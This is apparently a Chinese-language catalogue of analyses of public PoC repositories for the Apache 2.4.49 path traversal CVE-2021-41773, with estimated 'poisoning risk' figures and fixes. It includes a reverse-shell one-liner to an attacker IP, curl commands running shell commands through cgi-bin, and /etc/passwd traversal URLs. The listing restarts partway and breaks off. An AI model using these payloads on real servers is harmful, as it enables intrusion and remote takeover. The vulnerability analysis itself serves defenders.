    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
